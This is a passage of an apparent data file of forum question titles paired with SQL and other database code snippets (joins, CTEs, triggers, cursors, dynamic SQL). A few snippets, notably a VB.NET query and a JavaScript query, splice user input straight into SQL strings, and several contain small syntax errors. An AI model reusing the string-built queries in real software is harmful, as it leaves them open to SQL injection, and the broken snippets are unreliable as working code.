    cmboxType.Items.AddRange(lines)
End Sub

Private Sub delete_item()
    Dim sw As New System.IO.StreamWriter(""C:\database.dat"")
    For i As Integer = 0 To lines.Length - 1
        If i <> cmboxType.SelectedIndex Then
            sw.WriteLine(lines(i))
        End If
    Next
    sw.Close()
End Sub
"
24579,26088,calling Oracle SQL via Excel Parameters not reading,"select t.*, dsp.day_work_hours as SHIFT  from 
(select employee, decode( param1, 1, day_1, 2, day_2, 3, day_3, 4, day_4, 5, day_5, 6, day_6,7, day_7,8, day_8,9, day_9,10, day_10, 11, day_11, 12, day_12, 13,day_13, 14,day_14,15,day_15,16,day_16,17,day_17,18,day_18,19,day_19,20,day_20,21,day_21,22,day_22,23,day_23,24,day_24,25,day_25,26,day_26,27,day_27,28,day_28,day_29,30,day_30,31,day_31) as day_shift 
from odb.location_site_emp_schl_tmplt
where group_month = param2
and group_year = param3) T 
inner join odb.daily_shift_pattern dsp on dsp.day_pattern = t.day_shift
"
16665,72443,Need to select from multiple tables based upon records in one table,"CREATE VIEW viewCommonElements
AS

SELECT 
100      as DataType,
NoteId   as ElementId,
NoteName as ElementName
FROM Notes

UNION

SELECT 
200                as DataType,
Classified_Post_Id as ElementId,
Post_Description   as ElementName
FROM Classified_Posts

UNION

SELECT 
300                as DataType,
EventId            as ElementId,
EventName          as ElementName
FROM Events
"
20343,58960,CASE statement to combine two columns except when first characters not similar,"SELECT 
    CASE 
       WHEN left(LastName1,4) <> left(LastName2,4) 
          THEN LastName1 + ', ' + LastName2 
       ELSE LastName1 END AS LastName
"
22070,70179,Populating the primary ID column with a sequential number in an SQL Server table,"WHILE @DateVar <= @EndDate
BEGIN

  select @PL_ID = @PL_ID + 1

  INSERT INTO Logger_test2(PL_ID,Log_Date,In_Time,Out_Time)
  SELECT @PL_ID,@DateVar,
  etc etc

  Set @DateVar= DATEADD(d,1,@DateVar)
  -- NO Update statement
END
"
13055,37951,Merge Statement with two inserts?,"DECLARE @MergeOutput1 table
(
  ActionType nvarchar(10),
  BookID int,
  OldBookTitle nvarchar(50),
  NewBookTitle nvarchar(50),
  ModifiedDate datetime
);

-- use MERGE statement to perform update on Book2

MERGE Books2 AS b2
USING Books AS b1
ON (b2.BookID = b1.BookID)
WHEN MATCHED
THEN UPDATE
SET b2.BookTitle = b1.BookTitle
OUTPUT
    $action,
    INSERTED.BookID,
    DELETED.BookTitle,
    INSERTED.BookTitle,
    INSERTED.ModifiedDate
  INTO @MergeOutput1;
"
15750,54232,Splitting one row into more rows -- table transformation,"INSERT INTO dbo.line_sensor_value
(UTC, line_no, sensor_no, sensor_value)
select UTC, line_no, sensor_no, temperature_1 as sensor_value from dbo.Data
union
select UTC, line_no, sensor_no, temperature_2 as sensor_value from dbo.Data
union
select UTC, line_no, sensor_no, temperature_3 as sensor_value from dbo.Data
union
select UTC, line_no, sensor_no, temperature_4 as sensor_value from dbo.Data
"
37531,50295,Get partial weeks when generating series in postgresql,"SELECT generate_series(date_trunc('week', '2013-03-01'::date + 6)
                      ,date_trunc('week', '2013-03-14'::date)
                     ,'1 week')::date AS day
UNION  SELECT '2013-03-01'::date
ORDER  BY 1;
"
18094,36424,SQL: How to make a query that return last created row per each user from table's data,";WITH LastPerUser AS
(
   SELECT 
       ID, UserID, ClassID, SchoolID, Created,
       ROW_NUMBER() OVER(PARTITION BY UserID ORDER BY Created DESC) AS 'RowNum')
   FROM dbo.YourTable
)
SELECT 
   ID, UserID, ClassID, SchoolID, Created,
FROM LastPerUser
WHERE RowNum = 1
"
13120,10619,how to query a table to find rows where there are no numbers in a column,"SELECT TOP 10 *
FROM @WorkOrderHistory WO  
WHERE WO.WorkOrder LIKE '%[^0-9]%'
"
5529,1986,Count number of occurrences based on user id,"SELECT sum(leadtype_c = 'Referral') as Referrals,
       sum(leadtype_c = 'VM') as VMs,
       sum(leadtype_c = 'Email') as Emails,
       users.`first_name`, users.`last_name`
FROM users join
    `leads`
     on  users.`id` = leads.`assigned_user_id` INNER JOIN
     `leads_cstm`
     ON `leads`.`id` = `leads_cstm`.`id_c`
group by users.id;
"
19656,49218,SQL Sserver : two column have same value in different order and want only distinct combination,"select src, dest
from table t
where src < dest
union all
select dest, src
from table t
where dest > src and
      not exists (select 1 from table t2 where t.src = t2.dest and t.dest = t2.src);
"
6819,65620,Insert into with a sub select * not working,"INSERT INTO TableA (col1, col2)
SELECT col1, col2 FROM TableB
"
7980,6496,Convert 3 columns to Short Datetime format,"declare @t table (yearbirth int,monthbirth int,Datebirth int)
insert into @t (yearbirth,monthbirth,Datebirth) values (1979 ,5,1)

select CONCAT(Datebirth,'/',monthbirth,'/',yearbirth) from @t
"
15412,53748,RETURN inside a transaction with TRY-CATCH block,"BEGIN TRY
   IF @@TRANCOUNT > 0
      SAVE TRANSACTION MyTransactionName
   ELSE
       BEGIN TRANSACTION MyTransactionName

    IF NOT EXISTS(SELECT 1 FROM dbo.tblProducts WHERE intProductID = @intProductID)
        BEGIN
            SELECT 'Product does not exists' AS strMessage
            ROLLBACK TRANSACTION MyTransactionName
            RETURN
        END

    UPDATE dbo.tblProducts SET
        curPrice = 10
    WHERE
        intProductID = @intProductID

    SELECT 'Success' AS strMessage

    COMMIT TRANSACTION MyTransactionName
END TRY 

BEGIN CATCH
    SELECT ERROR_MESSAGE() AS strMessage
    ROLLBACK TRANSACTION MyTransactionName
END CATCH
"
11233,18005,Getting weird issue with TO_NUMBER function in Oracle,"select *
from (
  select /*+NO_MERGE*/ * 
  from country 
  where id >1 and id < 100000
)
where to_number(field1) = 23;
"
9064,14546,Returning many-to-one composite in SQL in one row,"WITH cte (userId, roleList, roleNameTemp, level)
as 
(
    SELECT  userId
            , CAST( '' AS VARCHAR(max) )
            , CAST( '' AS VARCHAR(200) )
            , 0 level
    FROM    Role
    GROUP BY UserId 
    UNION ALL
    SELECT  r.userId
            , roleList + 
                CASE WHEN level = 0 THEN '' ELSE ', ' END + RoleName 
            , CAST( RoleName AS VARCHAR(200))
            , level + 1
    FROM CTE c
    INNER JOIN Role r ON c.userId = r.userid
    WHERE   r.RoleName  > c.roleNameTemp 
)

SELECT      UserId
            ,FirstName
            ,LastName
            ,roleList 
FROM 
(
    SELECT      u.UserId
                ,u.FirstName
                ,u.LastName
                ,c.roleList 
                ,ROW_NUMBER() OVER (Partition by c.userid order by level desc) rowNumber
    FROM        cte c
    INNER JOIN  [User] u on c.userId = u.UserId
)   r
WHERE rownumber = 1
"
29934,26590,Auto-increment the value only when the value of another column changes sql server,"WITH CTE (Col1, RowNumber)
AS
(
    SELECT <YOUR_COLUMN_NAME_HERE> AS Col1, ROW_NUMBER() OVER (ORDER BY Col1) As RowNumber
    FROM <YOUR_TABLE_NAME_HERE>
)

SELECT Col1, 
(
    SELECT COUNT(DISTINCT Col1)
    FROM CTE InnerCTE
    WHERE InnerCTE.RowNumber <= OuterCTE.RowNumber
) As NumberOfDistinctItemsInCol1
FROM CTE OuterCTE
"
34264,63601,sql statement how to keep null value,"select u.uno, sum(case ur.response when null then 0 else 1 end) as Test1
  from question q
       cross join users u
       left join userresponse ur
         on q.eno = ur.eno
        and q.qno = ur.qno  
        and q.correctanswer = ur.response 
        and u.uno = ur.uno
 where q.eno = '1' 
group by u.uno
"
12728,18211,Inclusion of both inclusive and exclusive range in the same table,"
with ranges as 
  (
    select 6 as val, 0 as start, 1 as count_all
 union all
    select 12, 7, 1
    union all
    select 18, 13, 1
    union all
 select 24, 19, 1
    union all
 select 30, 25, 1
    union all  
 select 36, 31, 1
    union all 
 select 42, 37, 1
    union all
 select 48, 43, 1
    union all   
 select 1, 49, 0
  )
select case when ranges.count_all = 0
            then 'more'
            else  convert (varchar(10), ranges.val) 
        end [MetLifeExperienceMonths],
       sum (case when (ranges.count_all = 0 and GoldListHistogram.MetLifeExperienceMonths>=1)
                   or
           (GoldListHistogram.MetLifeExperienceMonths=1)
                 then 1 else 0 end) [count inclusive],
       sum (case when (ranges.count_all = 0 and GoldListHistogram.MetLifeExperienceMonths>=1)
                   or
           (GoldListHistogram.MetLifeExperienceMonths=ranges.start)
                 then 1 else 0 end) [count exclusive],
count(EmployeeID) as 'Total'
into yy
from GoldListHistogram
cross join ranges
where MetLifeExperienceMonths > 0
group by ranges.val, ranges.count_all;

"
20328,22791,Sql filter command only if column value not equal,"SELECT 
     NAME, 
     Country, 
     NORMAL_STATE, 
     CURRENT_STATE 
FROM SOMS_TABLE 
WHERE SOMS_TABLE.NAME LIKE 'AR%' 
AND NORMAL_STATE <> CURRENT_STATE
ORDER BY SOMS_TABLE.Country ASC
"
85,38228,Compare dates in select,"SELECT *, CASE WHEN coalesce(timestamp,'01/01/1901')>coalesce(ts,'01/01/1901') THEN 1 ELSE 0 END TimeStampBigger
FROM   (SELECT *
        FROM   EventLog AS el
               RIGHT JOIN (SELECT Min(id) AS gId
                           FROM   EventLog
                           WHERE  Value IS NOT NULL
                           GROUP  BY Value) AS e
                       ON el.Id = e.gId) AS el
       LEFT JOIN (SELECT userid           AS uId,
                         Max([timestamp]) AS ts
                  FROM   UserAdditionStamp
                  GROUP  BY UserId) AS ua
              ON el.UserId = ua.uId
WHERE  el.EventTypeId = 3
"
35409,68644,How to convert a MS SQL Merge Query to work with MySQL DB?,"UPDATE UpcomingEvents as Ue
   INNER JOIN MCList AS MC ON (Ue.post_title = MC.post_title)
   SET Ue.sku_crmid = MC.sku_crmid
"
5491,36194,MySQL select rows having common column,"SELECT conversation
FROM conversation_user
GROUP BY conversation
HAVING count(*) = 2 AND
       sum(user in (1, 2)) = count(*);
"
39776,46715,"How do you find which database a table is located in, of which you know the name (e.g. dbo.mytable1), in Microsoft SQL Server Management Studio 2005?","EXEC sp_MSForEachDB 'USE [?] IF OBJECT_ID(''dbo.mytable'') IS NOT NULL PRINT ''?'''
"
30540,66105,calculate duration in years months and days for each row,"Declare @DOB DateTime
DECLARE @yy INT
DECLARE @mm INT
DECLARE @getdd INT
DECLARE @dd INT

SET @DOB='2011-10-11 00:00:00.000'

SET @yy = DATEDIFF(mm, @DOB, GETDATE())/12
SET @mm = DATEDIFF(mm, @DOB, GETDATE())%12 - 1
SET @dd = ABS(DATEDIFF(dd, DATEADD(mm,@mm , DATEADD(yy, @yy, @DOB)), GETDATE()))

SELECT Convert(varchar(10),@yy) + ' Years ' + Convert(varchar(10),@mm) + ' Months '  + Convert(varchar(10),@dd) + ' Days '
"
16554,57989,Combine two select,"SELECT type, COUNT(NumFact) AS Num
FROM test
WHERE type IN ('A','B')
GROUP BY type;
"
31998,19359,Query listing company name and first order date,"select c.CustomerID, CompanyName, MIN(o.OrderDate) as 'first order date'
from
    Customers c
    join Orders o on c.CustomerID = o.CustomerID
group by c.CustomerID, CompanyName 
order by c.CustomerID 
"
3325,70538,sql sp_sqlexec dealing with single quotes in statement,"declare @id int = 1
declare @sql nvarchar(2000)

declare @col2 varchar(10) = 'problem'

set @sql = 'insert into mytable (col1, col2) values (1, @col2)'

exec sp_executesql @sql, N'@Col2 varchar(10)', @col2 = @col2
"
19610,32771,Joining with dynamic sql,"...
/* Your existing code */
SET @sql 
  = CONCAT('SELECT account_id, ', @sql, ' 
            from yt
            group by account_id');

/* Now put your derived table stuff in */
SET @sql 
  = CONCAT('select a.account_id, b.something_else
            from some_table as b join (', @sql, ') as a
            on a.account_id = b.account_id');

/* Continue your existing code */
PREPARE stmt FROM @sql;
...
"
30565,16746,I'm trying to next statements using sql select & vb .net,"SELECT weather.event, weather.date, weather.time, location,
    accident.roadway_number, accident.mile_marker
FROM weather
LEFT OUTER JOIN accident on weather.date = accident.date and weather.time = accident.time
    and weather.location = accident.location
WHERE date= '"" & datepicker.Text & ""' AND time = '"" & eventTime.SelectedItem.Value & ""'
"
1899,70128,Nested foreach loop in laravel 5.2,"$instances = DB::table('instances')
    ->select(DB::raw('*, MAX(date) as last_seen_date'))
    ->groupBy('ad_id')
    ->get();
"
27269,24386,SQL ORDER BY but also by MIN of different col (aka threading)?,"SELECT
    table.Type,
    table.value
FROM (
    SELECT 
        Type,
        min(value) AS minValue
    FROM table
    GROUP BY Type
) AS sub
INNER JOIN table
    ON table.Type = sub.Type
ORDER BY sub.minValue ASC, table.Type ASC, table.value ASC
"
5790,39878,db2 sql IN OR performance,"SELECT
    A, B, C
FROM
    MY_TABLE m
JOIN
    (VALUES 'VAL1','VAL2','VAL3') AS v(Value)
    ON
    m.Z = v.Value
"
12612,60625,SQL Concatenating distinct values from multiple columns into one row,"select concat_ws(' ',
                 group_concat(distinct product separator ' '),
                 group_concat(distinct category separator ' '),
                 group_concat(distinct class separator ' ')
                )
from tab t;
"
18822,6160,How to get first n numbers from float,"Select * from A where Left(Cast(float_value as BigInt), 4) = xxxx 
"
39602,70109,Trigger on Update to update all the child nodes,"DECLARE 
id_upd INT[];
...
BEGIN
...

SELECT array ( SELECT id FROM local WHERE parent_id=NEW.id ) into id_upd; --- select direct childs
    IF id_upd IS NOT NULL THEN              
        FOREACH i IN ARRAY id_upd LOOP      
           UPDATE local SET path=NEW.path||'.'||abbreviature where id=i; --- update them
        END loop;       
    END IF;

END;
"
25483,51857,Grouping values for INSERTion into table,"INSERT INTO ""#t"" VALUES (1), (2), (3);
"
20352,9426,Fast solution to fill create and fill db table with data from csv file,"require 'csv'

CSV.foreach(fileName, :headers => true, encoding: ""UTF-8"") do |row|
  row['myfiled'].to_s
end
"
10907,2527,SQL Stored procedure to get concatenated string of all previous years records,"-- first we need to extract months/years to get comparable and sortable values
-- otherwise we can't select ""all previous years"" and ""last value"".
;with converted as (
    select
        time,
        right(time, 4) as year,
        datepart(m, '2000-' + left(time, 3) + '-01') as month,
        right(time, 4) + ',' + convert(varchar(16), value) as concatenated,
        value
    from
        YourTableName --TODO: Replace this with your table name
)
select
    time,
    value,
    -- using xml for string concatenation
    isnull((
        select
            prev.concatenated + ',' as 'text()'
        from
            converted as prev
        where
            prev.year < main.year
            and prev.month = (select max(month) from converted lookup where lookup.year = prev.year)
        for
            xml path('')
    ),'')
    + main.concatenated
from
    converted as main
"
29919,53332,SELECT… INSERT with NOT NULL fields,"insert ignore into table2
(description)
select t.description from table1 t
join 
(
select distinct description from table1
) t1 on (t.description=t1.description);
"
33839,11363,SQL*Plus - How do you hide SET ECHO OFF?,"sqlplus -S user/password@db @path/to/your/script
"
29684,64258,Statement trigger in Oracle?,"CREATE OR REPLACE TRIGGER trg_xyz
AFTER UPDATE ON tableX
DECLARE
  v_sum number;
BEGIN

  SELECT SUM(VALUE) into v_sum
  FROM tableX;

  IF v_sum < 30 THEN
    raise_application_error(-20001,""ERROR MESSAGE"");
  END IF;
END;
/
"
27650,64628,"SQL If two records exist, choose which one you want to display Teradata","select  sorce_claim_id
        ,claim_sorce_syst_cd
        ,sorce_agrmt_id
        ,asgn_sorce_syst_cd
from    edw_p.claim_agrmt
where   sorce_claim_id = '4513049'
and     asgn_sorce_syst_cd = 'CLONE'
UNION
select  sorce_claim_id
        ,claim_sorce_syst_cd
        ,sorce_agrmt_id
        ,asgn_sorce_syst_cd
from    edw_p.claim_agrmt
where   sorce_claim_id = '4513049'
and     asgn_sorce_syst_cd = 'GRASN'
and     source_claim_id NOT IN (select sorce_claim_id from edw_p.claim_agrmt where asgn_sorce_syst_cd = 'CLONE')
"
38648,3004,"Add dynamic values in sql where clause, but its not working","var mySQL = ""SELECT SUM(amount1) AS OrderTotal FROM budget1 WHERE month='""+hello+""'"";

transaction.executeSql(mySQL, [], dataSelectHandler, errorHandler);
"
13014,67651,"I want to update values in column, based on condition that need to compare data from another table","UPDATE CLIENTS
SET DIFFERENCE = CASE WHEN EXISTS
                 (SELECT 1 FROM DOCUMENT
                  WHERE ID_CLIENT = CLIENTS.ID_CLIENT
                  AND MONTHS_BETWEEN(TO_DATE(DATA,'MM/DD/YYYY'),SYSDATE) > 4) 
                 THEN 'Above' 
                 ELSE 'Below' END
"
8464,38367,Add row that is duplicate except for one column,"INSERT INTO `<table>` (column1, column2, ...)
SELECT 'Jim', column2, ... FROM ... WHERE ...
"
32460,70353,Two SK's in one table,"SELECT CURRENCY_SK_FROM,
       (SELECT CURRENCY_NAME
            FROM CURRENCY
            WHERE CURRENCY_SK = CURRENCY_SK_FROM) AS CURRENCY_NAME,
       CURRENCY_SK_TO,
       (SELECT CURRENCY_NAME
            FROM CURRENCY
            WHERE CURRENCY_SK = CURRENCY_SK_TO) AS CURRENCY_NAME_TO,
       CONVERSION_RATE
    FROM CONVERSION_RATE_TABLE;
"
33432,24287,Only select items where a table contains two specific values,"SELECT j.id
FROM journey j JOIN
     journey_day jd
     ON jd.journey = j.id JOIN
     pattern p
     ON p.id = j.pattern JOIN
     pattern_link pl
     ON pl.section = pattern.section
WHERE p.service = :service AND p.direction = :direction AND jd.day = :day
GROUP BY j.id
HAVING sum(p.busstop = :arrival) > 0 and
       sum(p.busstop = :departure) > 0;
"
4170,69060,Can I use SELECT statement inside INSERT values?,"INSERT
INTO    tbl_vaucher (vaucher_name, created_date)
SELECT  TOP 1
        con_full_name, GETDATE()
FROM    tbl_contact
"
11008,63888,SQL - Call Stored Procedure for each record,"DECLARE @oneid int -- or the appropriate type

DECLARE the_cursor CURSOR FAST_FORWARD
FOR SELECT spro.Id  
    FROM SomeTable as spro 
        INNER JOIN [Address] addr ON addr.Id = spro.Id  
        INNER JOIN City cty ON cty.CityId = addr.CityId 
    WHERE cty.CityId = @CityId

OPEN the_cursor
FETCH NEXT FROM the_cursor INTO @oneid

WHILE @@FETCH_STATUS = 0
BEGIN
    EXEC UpdateComputedFullText @oneid

    FETCH NEXT FROM the_cursor INTO @oneid
END

CLOSE the_cursor
DEALLOCATE the_cursor
"
32644,718,Merging multiple oracle queries to produce one result,"select * from
(select count(*) from tableA),
(select count(*) from tableB),
(select count(*) from tableC),
(select count(*) from tableD);
"
31370,22361,Vertica SQL insert multiple rows in one statement,"insert into analytics.bw_covariance_matrix 
SELECT 1, 4.01926965, -0.4686067, -0.07592112
UNION
SELECT 2, -0.46860675,  4.1799267, -0.82461139
UNION
SELECT 3, -0.07592112, -0.8246114,  4.37186211
"
9952,64691,JOIN in SQL with one-to-many relationship,"SELECT
    r.*,c.*
    FROM reps r
        LEFT OUTER JOIN (SELECT
                             rep_id,MAX(commentDate) AS MaxDate
                             FROM comments
                             GROUP BY rep_id
                        ) m On r.rep_id=m.rep_id
        LEFT OUTER JOIN comments c ON r.rep_id=c.rep_id AND m.MaxDate=c.commentDate
    ORDER BY r.rep_name
"
18031,11828,Selecting specific data based on multiple conditions,"WITH cte 
     AS (SELECT date, 
                name, 
                number, 
                rn = Row_number () 
                       OVER( 
                         partition BY date, name 
                         ORDER BY number DESC) 
         FROM   dbo.tablename) 
SELECT date, 
       name, 
       number 
FROM CTE
WHERE  rn = 1 
ORDER  BY date ASC
"
15151,31285,Oracle SQL Find Highest ID Across All Tables,"SQL> set serveroutput on
SQL> declare
  2      l_id pls_integer;
  3      max_id pls_integer;
  4      max_tab_name varchar2(30);
  5  begin
  6      max_id := 0;
  7      for r in ( select table_name
  8                 from user_tab_columns
  9                 where column_name = 'ID' )
 10      loop
 11          execute immediate 'select max(id) from '||r.table_name
 12              into l_id;
 13          if l_id > max_id
 14          then
 15              max_id := l_id;
 16              max_tab_name := r.table_name;
 17          end if;
 18      end loop;
 19      dbms_output.put_line('Highest score = '||max_id||' table='||max_tab_name);
 20  end;
 21  /
Highest score = 2010070705 table=SESSIONS

PL/SQL procedure successfully completed.

SQL>
"
17276,178,SQL Server Ordering Based on two columns - parent and child,"select primary, secondary
from (select t.primary, t.secondary,
             max(case when tsub.primary is not null then 1 else 0 end) as hasprimary
      from t left outer join
           t tsub
           on t.secondary = t.primary
      group by t.primary, t.secondary
     ) a
order by (case when hasprimary = 1 then secondary else primary end),
         hasprimary desc,
         secondary
"
8920,35373,How to write a SQL query to insert from a triple many-to-one relationship to a many-to-many relationship?,"declare @idC table(id int)
declare @fkeyC int, @fkeyA1 int, @fkeyA2 int, @fkeyA3 int, @name varchar(8)
declare CursorB cursor fast_forward for select fkeyA1, fkeyA2, fkeyA3, name from TableB
open CursorB
fetch next from CursorB into @fkeyA1, @fkeyA2, @fkeyA3, @name
while @@fetch_status = 0
begin
    insert into TableC(name) output inserted.id into @idC values (@name)
    set @fkeyC = (select top 1 id from @idC)
    insert into TableD(fkeyC, fkeyA) values (@fkeyC, @fkeyA1), (@fkeyC, @fkeyA2), (@fkeyC, @fkeyA3)
    delete from @idC
    fetch next from CursorB into @fkeyA1, @fkeyA2, @fkeyA3, @name
end
close CursorB
deallocate CursorB
"
23360,70718,Insert local .csv data in remote SQL Server via already working connection string,"#!/usr/bin/perl

# PERL MODULES
use strict;
use DBI;
use DBD::ODBC;
use Text::CSV;
use List::MoreUtils qw(each_array);

# SOME VARIABLES
my $file = '/tmp/Stevo/clientlist.csv';
my $csv = ();
my $fh = ();
my $data_source = q/dbi:ODBC:MSSQLServer/;
my $user = q/username/;
my $password = q/password/;

# WRITE HOSTNAMES FROM CSV TO ARRAY
my @hostnames;
open (my $csv, '<', $file) || die ""cant open"";
foreach (<$csv>) {
   chomp;
   my @fields = split(/\,/);
   push @hostnames, $fields[0];
}
# WRITE CLIENTVERSIONS FROM CVS ARRAY
my @clientversions;
open (my $csv, '<', $file) || die ""cant open"";
foreach (<$csv>) {
   chomp;
   my @fields = split(/\,/);
   push @clientversions, $fields[1];
}
# CONNECTION STRING
my $dbh = DBI->connect($data_source, $user, $password, {RaiseError => 0, PrintError => 1}) or die ""Can't connect to $data_source: $DBI::errstr"";

# INSERTION CODE
my $sth_insert = $dbh->prepare('INSERT INTO dbo.LegatoClients (ClientName, ClientVersion) VALUES (?, ?)')
  or die $dbh->errstr;
   # EVERYTIME $EA IS CALLED THE NEXT LINE OF THE ARRAYS WILL BE RETURNED 
my $ea = each_array(@hostnames, @clientversions);
   # SET VALUES USING THE EVERYTIME ARRAY
while ( my ($val_hostnames, $val_clientversions) = $ea->() ) {
  $sth_insert->execute($val_hostnames, $val_clientversions) or die $dbh->errstr;
}
"
25780,28676,Update Columns Where The Parameter Has Been Supplied From Code,"SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE PROCEDURE sp_UpdateTable

    @TableID int,
    @StartTime1 datetime,
    @StartTime1Specified BIT,
    @EndTime1 datetime,
    @EndTime1Specified BIT

AS
BEGIN
    SET NOCOUNT ON;

    UPDATE [Table]
       SET [StartTime1] = (CASE WHEN @StartTime1Specified = 1 THEN @StartTime1 ELSE [StartTime1] END)
          ,[EndTime1]   = (CASE WHEN @EndTime1Specified = 1 THEN @EndTime1 ELSE [EndTime1])
    WHERE TableID = @TableID
END
GO
"
30415,74093,How to create crosstab queries in PostgreSQL,"SELECT sampling_point, time_sampling,
       CASE WHEN sampling_point = 'floor' THEN entero ELSE NULL END AS entero_floor,   
       CASE WHEN sampling_point = 'wall' THEN entero ELSE NULL END AS entero_wall
FROM SourceTable
ORDER BY sampling_point DESC;
"
31557,63271,Access SQL: Choosing which table to SELECT from based on a condition,"SELECT *
FROM Attendance 
WHERE ([a checkbox on a form that indicates whether the user wants the condition] and condition) or
      (not [a checkbox on a form that indicates whether the user wants the condition] )
"
38378,17711,"Selecting id (in this case dupersid) where value from the second column (in this case icd9codx) is in (296, 311) and 250 only","SELECT * 
FROM public.sample_test 
WHERE dupersid IN(SELECT dupersid FROM public.sample_test
                  GROUP BY dupersid
                  HAVING SUM(CASE icd9codx WHEN 250 THEN 1
                                           WHEN 296 THEN 2 
                                           WHEN 311 THEN 4
                                           ELSE 8 END) IN (3, 5) AND
                         SUM(CASE WHEN icd9codx = 250 THEN 1  
                                  ELSE 0 END) = 1)
"
2701,843,Unable to set ID column in case of left outer join,"select 1 as ID,
       C.RowID,
       C.Position,
       F.Data
from tblComplete as C
  left outer join tblFiltered as F
    on C.Position = F.Position
order by C.RowID, C.Position
"
23218,65838,Query to return text if row is null from oracle db,"SELECT nvl(paramOne, 0), nvl(trim(paramTwo), 'EMPTY')
FROM tableName
WHERE search_param = 'x'
"
30693,58826,SQL COUNT - Output table with two COUNT columns with differing WHERE clauses,"select associated_project as project,
count(case when issue_status='OPEN' then 1 else null end) as open_issue_count,
count(case when issue_status='CLOSED' then 1 else null end) as closed_issue_count
from table
group by associated_project;
"
30392,49315,SQL XQuery and Cross Apply problems...too many rows in results,"WITH XMLNAMESPACES('http://schemas.datacontract.org/2004/07/Zeller.Gp' AS ZC, 
    'http://schemas.datacontract.org/2004/07/Zynergy' AS ZYN)

SELECT Contract, LineName.value('.', 'varchar(50)') as LineItemName, ProjName.value('.', 'varchar(50)') as ProjectName
FROM @contract AS CM 
CROSS APPLY CM.FullContract.nodes('/ZC:ZEstimateContract/ZC:_projects/ZC:ZEstimateProject/ZYN:Name') as Proj(ProjName)
CROSS APPLY Proj.ProjName.nodes('../ZC:_lines/ZC:ZEstimateLine/ZYN:Name') as Line(LineName)
"
15929,49505,Insert row with id into a table with auto increment on,"INSERT #1 --created id 1
INSERT #2 --created 2
INSERT #3 -- created 3
DELETE 2 --2 gone, leaves a gap
set identity_insert your_table on
INSERT VALUES ( 2, ... ) -- filled gap again
set identity_insert your_table off
"
30268,8620,Select records / count distinct from another table,"SELECT
    S.GameID,
    S.LeagueID,
    S.SeasonID, 
    S.DatePlayed, 
    S.TimePlayed, 
    S.HomeTeamID, 
    S.VisitorTeamID, 
    HomeTeam.TeamName AS HomeTeamName, 
    VisitorTeam.TeamName AS VisitorTeamName,
    CASE WHEN gs.GameID IS NULL THEN 'False' ELSE 'True' END AS HasGameStats
FROM schedules S
INNER JOIN teams AS HomeTeam ON S.HomeTeamID = HomeTeam.TeamID   
INNER JOIN teams AS VisitorTeam ON S.VisitorTeamID = VisitorTeam.TeamID
    LEFT JOIN GameStats gs ON s.GameID = gs.GameID
WHERE S.LeagueID = <cfqueryparam value=""#application.leagueid#"" cfsqltype=""cf_sql_integer"">
    AND S.SeasonID = <cfqueryparam value=""#application.seasonid#"" cfsqltype=""cf_sql_integer"">
ORDER BY S.GameID DESC
"
20195,35759,Pick Values from Grouped Rows in Postgres,"Select Z.Code, Z.PrevCode
From (
     Select Id, Code, Year
        , lag( Code, 1 ) Over ( Partition By Id Order By Year ) As PrevCode
     From tbl
     Where Year In(2016,2015)
     ) As Z
Where Z.Year = 2016
"
740,3304,Copy data from one table to another- Oracle,"declare
newId number;
begin
select nvl(max(person.pk),0) + 1 into newId from person;
for x in (
    select w.Name, p.Address
    from wife w inner join Person p
    on w.Person_id = P.pk) loop
   insert into Person(pk, Name,Address,Is_Married) values (newId ,x.Name ,x.Address,'Y');
   newId := newId  +1;
end loop;
commit;
end
"
15000,70189,"In Mongo, how do I find all the documents, but display only their titles?","db.Books.find({ISBN : ""1234567890"" }, { title : 1 } );
"
24332,503,Select Users who have made the most positive contributions,"select 
     count(artc_status) as stats , 
     count(case when artc_status=1 then 1 end) Positive,      
     artc_user[Contributing User] 
from 
    contributions 
group by 
    artc_user 
order by  stats desc;
"
23869,56971,Mysql insert new row,"select * from table order by (id=4) DESC,id ASC
"
30085,5657,MySQL Query get total number of guests per company,"select 
    first_name,
    last_name,
    c.name as company_name,
    sc.date as screening_date,
    (
       select count(*) from guests
       inner join 
          user_guest_group  on user_guest_group.guest_id = guests.id
       inner join 
          companies  on companies.id = guests.company_id
       inner join
          screening_date_guest  on screening_date_guest.guest_id = guests.id
       inner join
          screening_dates  on screening_dates.id = screening_date_guest.screening_date_id
       where 
          screening_date_guest.attending = 1
       and  
          screening_date_id = 1 and company_id = c.id
    ) total_guests
from
    guests g
inner join 
    user_guest_group ugs on ugs.guest_id = g.id
inner join 
    companies c on c.id = g.company_id
inner join
    screening_date_guest sdg on sdg.guest_id = g.id
inner join
    screening_dates sc on sc.id = sdg.screening_date_id
where 
    sdg.attending = 1
and  
    screening_date_id = 1
group by
    first_name,
    last_name,
    c.id,
    c.name,
    sc.date 
"
34326,64052,Filter out the duplicates based on a group in SQL,"select parent_id, min(child_id), color
from your_tab
group by parent_id, color;
"
7267,69959,How to count the occurrences of a value in a row based on a WHERE condition?,"select ID,sum(i_count) as unpaid_count
from
(
select ID ,case when Jan = 'PAID' then 0 else 1 end as i_count,1 as month_no
from payments
union all
select ID, case when Feb = 'PAID' then 0 else 1 end ,2
from payments  
union all
select ID, case when Mar = 'PAID' then 0 else 1 end ,3
from payments
union all
select ID, case when Apr = 'PAID' then 0 else 1 end ,4
from payments 
union all
..
) A 
Where month_no <= strftime('%m', date('now')) 
"
37052,53768,Update subset of data in sqlserver,"UPDATE tb_Contact
SET ContactAssociate = 'Peter'
where PK_Of_tb_Contact
IN
(
SELECT TOP 14 PK_Of_tb_Contact
FROM tb_Contact 
WHERE tb_Contact.ContactAssociate = 'David' 
ORDER BY NEWID()
)
"
30507,26049,sql declare variable string and use in where clause,"DECLARE @midname varchar(200); 
SET @midname = 'Lara'; 
SELECT Replace(Replace(Names,@midname,''),'M',''); 
"
13562,61391,Two Trigger of same type on same table which will get executed first?,"create trigger TR2
after insert on table1
for each row
follows TR1 -------------------------------------------------<<
begin
 ...
end;
"
11446,44477,JOIN query with IN operator,"SELECT P.* 
FROM wp_posts AS P
INNER JOIN wp_comments AS C ON C.post_ID = P.post_ID
WHERE C.comment_ID IN (2, 4, 6, 7);
"
21238,27930,Resolve hostnames with t-sql,"exec master..xp_cmdshell 'nslookup intel.com'
"
28445,19125,Query with Chinese values,"sqlCommand.CommandText = ""insert into ExampleTable values(N'发现',N'发现',N'发现')""
"
2273,40683,Return Auto Increment value after inserting a record on a table,"DECLARE @NewID int

INSERT INTO User ([UserFirstName], [UserSurname], [UserDob]) Values ('Bob', 'Smith', '1979-01-01')

Select @NewID = SCOPE_IDENTITY()


